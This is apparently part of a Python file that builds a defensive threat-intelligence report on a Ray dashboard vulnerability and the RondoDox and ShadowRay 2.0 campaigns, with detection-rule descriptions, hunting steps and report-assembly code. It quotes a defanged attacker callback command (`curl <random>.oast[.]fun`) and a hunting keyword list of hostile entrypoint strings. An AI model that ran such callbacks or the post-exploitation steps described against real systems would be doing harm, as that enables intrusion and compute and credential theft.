- **ANALYST ASSESSMENT (medium):** CISA's classification more likely rests on documented attempts than on published intrusions (see Alternative Hypotheses). The September EPSS rise means the outlook should be treated as worsening.
- **UNKNOWN:** whether any exploitation of this CVE has succeeded.

## Threat Activity Context

**RondoDox (Bitsight, 2026-03-11).** A botnet observed from 2025-05-25 to 2026-02-16 that adds newly disclosed exploits quickly. It runs from exploitation servers at hosting providers that accept cryptocurrency, payload hosts that are mostly compromised residential connections, and four C2 servers. Its addition of this CVE before publication shows it watches proof-of-concept releases directly. [SOURCE-REPORTED]

**ShadowRay 2.0 / IronErn440 (Oligo, 2025-11-18; MITRE C0045).** A self-propagating campaign submitting jobs to exposed Ray dashboards. It is not this CVE: it uses the unauthenticated Jobs API on network-reachable dashboards, tracked as the disputed CVE-2023-48022. Reconnaissance used a job whose entrypoint is `curl <random>.oast[.]fun`, so vulnerable servers identify themselves by calling back. Post-exploitation included:
- Python reverse shells;
- XMRig mining with GPU hijacking;
- SSH key persistence;
- credential theft from job environments;
- payload hosting on GitLab, then GitHub.

[SOURCE-REPORTED; MITRE-mapped]

## Business Impact

Ray had 237 million downloads at the PyTorch Foundation's October 2025 announcement. Exposure is measured by deployments, not downloads. [VERIFIED FACT]

A compromised Ray node gives an attacker:
- arbitrary code execution;
- the node's GPU and CPU capacity;
- whatever secrets the jobs can read.

ShadowRay 2.0 victims lost production database credentials and cloud tokens this way. For AI teams, model weights, training data and pipeline credentials sit on the same hosts. [SOURCE-REPORTED]

## MITRE ATT&CK Mapping

| Technique | Applies to | Basis | Label |
|---|---|---|---|
| T1189 Drive-by Compromise | Path A: malicious page or ad reaches the victim during normal browsing | MITRE T1189 definition (includes malvertising); advisory | ANALYST ASSESSMENT, medium |
| T1190 Exploit Public-Facing Application | Path B: exposed dashboards | MITRE C0045 maps ShadowRay's exploitation of exposed Ray to T1190 | VERIFIED FACT (for ShadowRay) |
| T1059.006 Python | Post-exploitation: reverse shells | MITRE C0045 | SOURCE-REPORTED (ShadowRay) |
| T1105 Ingress Tool Transfer | Post-exploitation: XMRig download | MITRE C0045 | SOURCE-REPORTED (ShadowRay) |
| T1496.001 Compute Hijacking | Post-exploitation: GPU mining | MITRE C0045 | SOURCE-REPORTED (ShadowRay) |
| T1003.008 /etc/passwd and /etc/shadow | Post-exploitation: credential access | MITRE C0045 | SOURCE-REPORTED (ShadowRay) |

The earlier edition used T1190 for the browser path. T1189 fits better: the victim's browser is the delivery mechanism, and T1190 describes exploiting an internet-facing system.

## Detection Engineering

Three Sigma rules follow. None is lab-tested.

**Maturity states:**
- **SYNTAX_VALIDATED:** the rule and its condition parse without error in pySigma 1.5.1, the reference Sigma parser;
- **DRAFT:** reference logic you must tune.

**Telemetry required:**
- Rules 1 and 2 need web or proxy logs in front of port 8265 that capture request headers. Ray's own dashboard does not log them.
- Rule 3 needs Linux process-creation telemetry on Ray nodes (for example auditd or an EDR).

**Rule 1 — Browser-originated job submission (SYNTAX_VALIDATED).** Built from the fix: on an unpatched dashboard, a job POST that carries a browser User-Agent or any Sec-Fetch header is the exploit path, whatever the source address. Field names for Sec-Fetch headers vary by log pipeline; map `cs-sec-fetch-*` to yours.

```yaml
{browser_rule}```

**Rule 2 — Non-local Host header on the Jobs API (DRAFT).** In DNS rebinding the browser addresses the dashboard by the attacker's domain name. `Host` is a forbidden request header, so the page cannot disguise it: it carries the attacker's name, not localhost. Add your legitimate internal names to the filter. A reverse proxy that rewrites `Host` hides this signal.

```yaml
{rebinding_rule}```

**Rule 3 — ShadowRay-style reconnaissance on Ray nodes (SYNTAX_VALIDATED).** Catches the out-of-band callback (`curl <random>.oast.fun`) that ShadowRay used to find exploitable dashboards. Deploy it to Ray nodes; on other hosts it also fires on any interactsh use, including authorised testing.

```yaml
{exposed_rule}```

## Threat Hunting

1. **Review job history on every Ray dashboard:** run `ray job list --address http://127.0.0.1:8265`, or `GET /api/jobs/`. Look for entrypoints you did not submit, especially `curl`, `wget`, `bash -c`, base64 strings, `.oast.` domains, `xmrig` or `disown`.
2. **DNS rebinding:** in DNS or secure web gateway logs, find external names that resolved first to a public address and then to 127.0.0.1 or a private address within minutes, followed by browser traffic to port 8265.
3. **Exposure sweep:** list hosts listening on TCP 8265 on non-loopback interfaces, and processes started with `--dashboard-host 0.0.0.0`.
4. **Retrospective indicator search:** search firewall, proxy and DNS history from May 2025 onward for the indicators below.
5. **Persistence check:** on Ray nodes, look in `authorized_keys` for the ShadowRay key, and check for CPU or GPU use by processes Ray does not report.

## Indicators of Compromise

All values are defanged and published by their sources. They describe actor infrastructure, not confirmed CVE-2025-62593 intrusions. The address indicators are 7–16 months old, so use them for retrospective hunting rather than blocking.

**RondoDox (Bitsight; honeypot observations 2025-05-25 to 2026-02-16)**

{rondo_table}

**ShadowRay 2.0 (Oligo; November 2025; exposed-dashboard path, CVE-2023-48022)**

{shadow_table}

## Remediation

{recs}

## Forecast

MEDIUM confidence: attacks against network-reachable Ray dashboards will continue over the 90 days from 2026-10-01, given ShadowRay 2.0, the exposed population and EPSS at the 99th percentile. Browser-path exploitation of this CVE is possible but not yet confirmed. Watch for:
- a CISA rationale;
- honeypot reports of Ray job submissions without the "Mozilla" User-Agent prefix;
- further EPSS or KEV changes.

## Alternative Hypotheses

**What does CISA's "active" rating reflect?**
- **H1 (medium):** documented attempts such as RondoDox's, whether or not they succeeded.
- **H2 (low):** successful exploitation seen in data CISA has not published.

The RondoDox payload flaw weighs against RondoDox being a successful vector. H2 cannot be excluded.

**Which path carries more risk?**
- **H3 (medium):** exposed dashboards. They are attacked at scale and the fix does not cover them.
- **H4 (low):** developer workstations, because they are numerous and reachable through browsing. Chrome being unaffected limits H4.

## Intelligence Gaps

Five gaps remain open:
- whether any exploitation of this CVE has succeeded;
- what evidence led CISA to "active" and "automatable";
- why EPSS rose on 2026-08-24 and 2026-09-25;
- whether any actor has fixed RondoDox's User-Agent flaw;
- how many developer installations meet the browser-path prerequisites.

## Limitations

- **Detection:** the rules are not lab-tested. Rules 1 and 2 depend on header logging most Ray deployments do not have.
- **Indicators:** the indicators predate this CVE's KEV listing.
- **Exposed-server count:** the figure is Oligo's November 2025 measurement, not re-measured.
- **Analyst assessments:** these are labelled; facts come from the archived sources below.

## Appendix A: Sources & Evidence Ledger

Each source in this report, its retrieval and integrity details, and the excerpts relied on.

{appendix}
"""


def build_bundle() -> ReportBundle:
    graph = build_graph()
    rules = build_detection_rules()
    text = _rendered_text(graph, rules)
    material = [c for c in graph.claims.values() if c.has_evidence()]
    return ReportBundle(
        report_id=REPORT_ID,
        graph=graph,
        rendered_text=text,
        dimension_tags={"exploitation_state": ["c-ssvc", "c-rondodox-attempt", "c-confirmed-compromise"]},
        detection_rules=rules,
        metrics_registry=build_metrics_registry(),
        cited_metric_ids=["m-epss", "m-exposed", "m-downloads"],
        rendered_metric_ids=["m-epss", "m-exposed", "m-downloads"],
        regulatory_applicabilities=build_regulatory_applicabilities(),
        forecasts=[build_forecast()],
        hypothesis_sets=build_hypothesis_sets(),
        intelligence_gaps=build_intelligence_gaps(),
        threat_products=[build_cve_record()],
        review=None,
        is_premium_tier=True,
        depth_assessment=DepthAssessment(
            rendered_word_count=len(text.split()),
            material_claim_count=len(material),
            distinct_evidence_backed_sections=text.count("\n## "),
        ),
        technical_recommendation_count=len(RECOMMENDATIONS),
        technical_recommendations_with_evidence_basis=sum(1 for *_, cid in RECOMMENDATIONS if cid in graph.claims),
    )
